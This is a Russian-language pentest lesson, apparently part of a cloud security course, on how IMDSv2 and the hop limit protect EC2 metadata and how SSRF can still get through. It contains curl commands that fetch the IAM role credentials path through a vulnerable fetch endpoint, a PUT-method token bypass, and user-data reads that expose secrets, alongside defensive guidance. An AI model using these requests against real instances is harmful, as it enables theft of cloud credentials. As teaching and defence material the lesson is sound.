## Вопрос, с которого всё начинается

Ты нашёл SSRF на EC2-инстансе и уже предвкушаешь креды роли. Но вместо ответа metadata возвращает `401 Unauthorized`. Что изменилось и можно ли это обойти? Ответ — в двух механизмах AWS: IMDSv2 и hop limit. Разберём их на конкретном инстансе.

## Наш пример: EC2-инстанс с IMDSv2

Объект урока — инстанс `i-0abc123`, на котором крутится веб-приложение с SSRF. На инстансе назначена роль `deploy-role`. Начнём с простого запроса к metadata и посмотрим, что изменилось по сравнению с первым уроком.

```
$ curl -s "https://app.acme-corp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
HTTP/1.1 401 Unauthorized
{"code":"Unauthorized","message":"IMDSv2 is required"}
```

Сообщение прямо говорит: нужен IMDSv2. Разберёмся, что это.

## Шаг 1: IMDSv1 против IMDSv2

**IMDSv1** — старый режим: metadata отвечает на любой `GET`. Именно его эксплуатирует простой SSRF.

**IMDSv2** — новый режим: сначала нужно получить **токен** запросом `PUT`, а затем прикладывать его к каждому `GET` в заголовке. Это ломает простой SSRF, потому что тот умеет делать только `GET` без заголовков.

Вот полный правильный диалог с metadata в режиме IMDSv2:

```
$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
$ echo $TOKEN
AQAAA...xYz
$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
deploy-role
```

Сначала `PUT` вернул токен (он живёт до 6 часов), потом `GET` с этим токеном вернул имя роли. Дальше — как обычно, забираем креды.

## Шаг 2: обход IMDSv2 через SSRF

Если SSRF умеет **менять HTTP-метод и заголовки**, IMDSv2 не защищает. Многие «fetch»-эндпоинты позволяют задать метод или заголовки — тогда получаем токен через приложение:

```
$ curl -s "https://app.acme-corp.com/fetch" \
    -d "url=http://169.254.169.254/latest/api/token" \
    -d "method=PUT" \
    -d "headers[X-aws-ec2-metadata-token-ttl-seconds]=21600"
AQAAA...xYz
```

Получив токен, прикладываем его к следующему запросу. Если же SSRF жёстко фиксирован на `GET` — IMDSv2 его останавливает.

## Шаг 3: hop limit — почему из контейнера не выходит

Второй механизм — **hop limit** (предел хопов). Это счётчик, который уменьшается на каждом сетевом «прыжке». У metadata-запросов по умолчанию hop limit равен 1: запрос должен прийти **напрямую** от инстанса, без промежуточных маршрутизаторов.

Контейнер (Docker) — это отдельная сеть за NAT-маршрутизатором. Когда процесс внутри контейнера обращается к `169.254.169.254`, пакет проходит лишний хоп, счётчик обнуляется, и metadata не отвечает:

```
# внутри контейнера
$ curl -s http://169.254.169.254/latest/meta-data/
curl: (28) Connection timed out
```

Таймаут вместо `401` — типичный признак сработавшего hop limit. Так AWS защищает контейнеры от кражи роли хоста.

## Шаг 4: где hop limit не спасает

Защита не абсолютна. Если процесс выполняется **на самом хосте** (не в контейнере), hop limit = 1 его не блокирует — запрос прямой. Значит:

- RCE на хосте → metadata доступен;
- процесс в контейнере с `--network host` → тоже прямой доступ;
- приложение-контейнер с SSRF → обычно блокируется hop limit.

Поэтому при эксплуатации важно понять, **где именно** выполняется запрос: на хосте или в контейнере.

## Шаг 5: как проверить конфигурацию

Посмотреть, включён ли IMDSv2 и какой hop limit, можно через API:

```
$ aws ec2 describe-instances --instance-ids i-0abc123 \
    --query "Reservations[].Instances[].MetadataOptions"
[
  {
    "HttpTokens": "required",
    "HttpPutResponseHopLimit": 2,
    "HttpEndpoint": "enabled"
  }
]
```

`HttpTokens: required` — IMDSv2 обязателен. `HttpPutResponseHopLimit: 2` — разрешён один промежуточный хоп (то есть контейнеры могут достучаться). Комбинация `required` + `2` — типичный компромисс: и контейнеры работают, и IMDSv1 выключен.

## Шаг 6: как защищаться правильно

- **Включить IMDSv2** (`HttpTokens: required`) — закрывает простой SSRF.
- **Hop limit = 1** — закрывает контейнеры (если они не должны ходить в metadata).
- **Не давать приложению роль с широкими правами** — тогда даже кража кредов не критична.
- **Фильтровать исходящие запросы приложения** — запретить доступ к `169.254.169.254`.

## Шаг 7: что забрать с инстанса, если есть RCE

Попав на сам инстанс (а не только в SSRF), первым делом обходят metadata напрямую. Кроме кредов роли там есть ещё кое-что ценное:

```
$ curl -s http://169.254.169.254/latest/meta-data/instance-id
i-0abc123
$ curl -s http://169.254.169.254/latest/user-data
#!/bin/bash
export DB_PASSWORD=SuperSecret123
```

`user-data` — это скрипт, который выполнялся при загрузке инстанса. В нём очень часто остаются пароли и токены, потому что его писали «на один раз». Ещё есть `/latest/meta-data/identity-credentials/` — креды самой EC2 (менее интересны) и `/latest/meta-data/network/interfaces/macs/` — сетевая карта инстанса. Все они доступны напрямую с хоста.

## Шаг 8: почему hop limit бывает равен двум

По умолчанию у новых инстансов hop limit = 1. Но многие платформы (ECS, EKS, раннеры CI) ставят его в 2, потому что иначе их контейнеры не смогут читать metadata. Компромисс: контейнеры работают, но при этом любой SSRF в контейнерном приложении снова получает доступ к роли. Именно поэтому при пентесте всегда проверяют `MetadataOptions`, а не полагаются на «там наверняка IMDSv2».

## Шаг 9: чем IMDSv2 не является

IMDSv2 — не шифрование и не аутентификация личности. Это просто «доказательство усилия»: запрос с токеном доказывает, что клиент умеет сделать `PUT` и сохранить заголовок. Настоящий атакующий с RCE на машине легко проходит эту проверку. Поэтому IMDSv2 снижает риск именно **SSRF**, но не защищает от кода, выполняющегося на самом инстансе. Надёжная защита здесь — не давать приложению лишних прав и закрывать сетевой доступ к metadata.

## Частые вопросы

**«Почему из контейнера metadata молчит?»** Из-за hop limit: пакет проходит лишний хоп, счётчик обнуляется, ответ не приходит (таймаут, а не 401).

**«А если hop limit равен двум?»** Тогда контейнеры достучатся до metadata — и SSRF в контейнерном приложении снова опасен.

**«IMDSv2 полностью решает проблему?»** Нет. Он снижает риск SSRF, но не защищает от кода, выполняющегося на самой машине.

**«Что ещё забрать с инстанса?»** `user-data` (скрипт запуска, часто с паролями) и сетевые параметры из metadata.

## Что мы теперь знаем

По-простому:

1. IMDSv1 отвечает на простой GET; IMDSv2 требует токен через PUT.
2. Если SSRF умеет PUT и заголовки — IMDSv2 обходится.
3. Hop limit = 1 не пускает metadata-запросы из контейнеров.
4. С хоста (или контейнера с network host) metadata всё равно доступен.
5. Конфигурацию видно через `describe-instances` (MetadataOptions).

## На что смотреть дальше

- **Проверь, где ты исполняешься.** Контейнер или хост — от этого зависит всё.
- **Смотри ошибку.** `401` — IMDSv2; таймаут — hop limit.
- **Пробуй подмену метода.** Многие SSRF позволяют PUT.
- **Помни про роль.** Даже с metadata креды бесполезны, если роль пустая.

## Куда дальше

Мы разобрали сетевую защиту metadata. Дальше переходим к **serverless**: там сервера нет вообще, но есть роль функции — и она часто куда интереснее, чем роль машины. А пока запомни главное: IMDSv2 и hop limit — это два независимых барьера, и каждый обходится по-своему.

## Где пригодится

- **CTF (Cloud):** задачи с IMDSv2 и контейнерами.
- **Bug bounty:** SSRF на EC2-приложениях.
- **Пентест:** проверка конфигурации metadata на инстансах.
- **Blue team:** включать IMDSv2 и ограничивать hop limit.
